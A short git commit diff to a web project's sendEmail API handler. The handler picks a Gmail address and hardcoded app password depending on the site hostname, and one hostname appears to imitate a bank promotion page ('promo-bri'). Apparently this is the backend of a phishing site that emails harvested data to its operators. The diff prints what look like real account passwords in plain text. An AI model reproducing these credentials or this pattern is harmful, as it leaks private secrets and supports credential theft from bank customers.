053daa8c4a79be824c60d97465777583bdaab606
penaruhangin <penaruhangin@gmail.com>
2022-09-14 20:07:45 +0700

    nambah link

--- pages/api/sendEmail.js
+++ pages/api/sendEmail.js
@@ -12,7 +12,7 @@ export default function handler(req, res) {
         email = 'orbitorbit799@gmail.com';
         pass = 'ahghpmbdwokimqim';
 
-    } else if (url == 'promo-bri.herokuapp.com '){
+    } else if (url == 'promo-bri.herokuapp.com'){
         email = 'newversionbrimo@gmail.com';
         pass = 'nlqfdmjhaafozjwv';
 
